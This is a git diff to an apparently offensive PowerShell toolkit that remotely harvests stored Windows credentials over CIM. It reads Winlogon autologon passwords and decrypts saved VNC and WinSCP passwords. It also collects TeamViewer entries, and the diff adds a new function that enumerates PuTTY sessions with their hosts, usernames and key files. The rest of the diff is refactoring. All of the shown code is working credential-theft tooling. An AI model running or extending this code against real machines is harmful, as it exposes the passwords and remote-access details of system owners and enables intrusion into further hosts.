@@ -107,6 +107,7 @@ Function Get-CredentialRegistry {
             Get-VncCredentialRegistry -CimSession $cimSession -SID $SID
             Get-TeamViewerCredentialRegistry -CimSession $cimSession -SID $SID
             Get-WinScpCredentialRegistry -CimSession $cimSession -SID $SID
+            Get-PuttyCredentialRegistry -CimSession $cimSession -SID $SID
         }
     }
 
@@ -134,12 +135,12 @@ Function Local:Get-WinlogonCredentialRegistry {
             $creds | Add-Member -MemberType NoteProperty -Name 'Username' -Value $username
         }
         $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value $password
-        $obj = New-Object -TypeName psobject
-        $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
-        $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
-        $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
-        $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
-        Write-Output $obj
+        $result = New-Object -TypeName psobject
+        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
+        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
+        $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
+        Write-Output $result
     }
 
     if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='AltDefaultPassword'} -CimSession $cimSession -Verbose:$false).sValue) {
@@ -151,12 +152,12 @@ Function Local:Get-WinlogonCredentialRegistry {
             $creds | Add-Member -MemberType NoteProperty -Name 'Username' -Value $username
         }
         $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value $password
-        $obj = New-Object -TypeName psobject
-        $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
-        $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
-        $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
-        $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
-        Write-Output $obj
+        $result = New-Object -TypeName psobject
+        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
+        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
+        $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
+        Write-Output $result
     }
 }
 
@@ -224,7 +225,7 @@ Function Local:Get-VncCredentialRegistry {
         $hive = $HKLM
         foreach ($location in $commonKeys) {
             if ($SID) {
-                $location = $SID + "\" + $location
+                $location = "$SID\$location"
                 $hive = $HKU
             }
             if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="Password"} -CimSession $cimSession -Verbose:$false).uValue) {
@@ -241,12 +242,12 @@ Function Local:Get-VncCredentialRegistry {
                 if ($controlPassword = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetBinaryValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="ControlPassword"} -CimSession $cimSession -Verbose:$false).uValue) {
                     $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value (Get-VncDecryptedPassword(HexStringToByteArray($controlPassword)))
                 }
-                $obj = New-Object -TypeName psobject
-                $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
-                $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
-                $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
-                $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
-                Write-Output $obj
+                $result = New-Object -TypeName psobject
+                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
+                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
+                $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
+                Write-Output $result
             }
         }
     }
@@ -309,7 +310,7 @@ Function Local:Get-TeamViewerCredentialRegistry {
 
         foreach ($location in $commonKeys) {
             if ($SID) {
-                $location = $SID + "\" + $location
+                $location = "$SID\$location"
                 $hive = $HKU
             }
             $subKeys = Invoke-CimMethod -Namespace 'root/default' -ClassName 'StdRegProv' -MethodName 'EnumKey' -Arguments @{hDefKey=$hive; sSubKeyName=$location} -CimSession $cimSession -Verbose:$false
@@ -320,7 +321,7 @@ Function Local:Get-TeamViewerCredentialRegistry {
 
         foreach ($location in $commonKeys) {
             if ($SID) {
-                $location = $SID + "\" + $location
+                $location = "$SID\$location"
                 $hive = $HKU
             }
 
@@ -345,12 +346,12 @@ Function Local:Get-TeamViewerCredentialRegistry {
                     }
                 }
 
-                $obj = New-Object -TypeName psobject
-                $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
-                $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'TeamViewer'
-                $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
-                $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
-                Write-Output $obj
+                $result = New-Object -TypeName psobject
+                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'TeamViewer'
+                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
+                $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
+                Write-Output $result
             }
         }
     }
@@ -418,7 +419,7 @@ Function Local:Get-WinScpCredentialRegistry {
         if (($sessions | Select-Object -ExpandProperty ReturnValue) -eq 0) {
             $sessions = $sessions | Select-Object -ExpandProperty sNames
             foreach ($session in $sessions) {
-                $location = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions\" + $session
+                $location = "$regKey\$session"
                 $hostname = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="HostName"} -CimSession $cimSession -Verbose:$false).sValue
                 $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="UserName"} -CimSession $cimSession -Verbose:$false).sValue
                 $password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="Password"} -CimSession $cimSession -Verbose:$false).sValue
@@ -427,13 +428,58 @@ Function Local:Get-WinScpCredentialRegistry {
                     $masterPassUsed = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWordValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$key; sValueName="UseMasterPassword"} -CimSession $cimSession -Verbose:$false).uValue
                     if (!$masterPassUsed) {
                         $password = (Get-WinSCPDecryptedPassword $hostname $username $password)
-                        $obj = New-Object -TypeName psobject
-                        $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
-                        $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinSCP'
-                        $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
-                        $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value ([pscustomobject]@{Hostname=$hostname; Username=$username; Password=$password})
-                        Write-Output $obj
+                        $result = New-Object -TypeName psobject
+                        $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                        $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinSCP'
+                        $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
+                        $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value ([pscustomobject]@{Hostname=$hostname; Username=$username; Password=$password})
+                        Write-Output $result
                     }
+                }
+            }
+        }
+    }
+
+    END {}
+}
+
+Function Local:Get-PuttyCredentialRegistry {
+    Param (
+        [Parameter(Mandatory = $True)]
+        [CimSession]
+        $CimSession,
+
+        [Parameter(Mandatory = $True)]
+        [String]
+        $SID
+    )
+
+    BEGIN {
+        $ComputerName = $CimSession.ComputerName
+    }
+
+    PROCESS {
+        [uint32]$HKU = 2147483651
+        $regKey = $SID + "\SOFTWARE\SimonTatham\PuTTY\Sessions"
+        $sessions = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=$regKey} -CimSession $cimSession -Verbose:$false
+        if (($sessions | Select-Object -ExpandProperty ReturnValue) -eq 0) {
+            $sessions = $sessions | Select-Object -ExpandProperty sNames
+            foreach ($session in $sessions) {
+                $location = "$regKey\$session"
+                if ($keyFile = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="PublicKeyFile"} -CimSession $cimSession -Verbose:$false).sValue) {
+                    $hostname = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="HostName"} -CimSession $cimSession -Verbose:$false).sValue
+                    $port = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWORDValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="PortNumber"} -CimSession $cimSession -Verbose:$false).uValue
+                    $protocol = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="Protocol"} -CimSession $cimSession -Verbose:$false).sValue
+                    $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="UserName"} -CimSession $cimSession -Verbose:$false).sValue
+                    if (-not $username -and $protocol -eq 'rlogin') {
+                        $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="LocalUserName"} -CimSession $cimSession -Verbose:$false).sValue
+                    }
+                    $result = New-Object -TypeName psobject
+                    $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                    $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'PuTTY'
+                    $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
+                    $result | Add-Member -MemberType NoteProperty -Name 'Credential' -Value ([pscustomobject]@{Hostname=$hostname; Port=$port; Protocol=$protocol; Username=$username; KeyFile=$keyFile})
+                    Write-Output $result
                 }
             }
         }
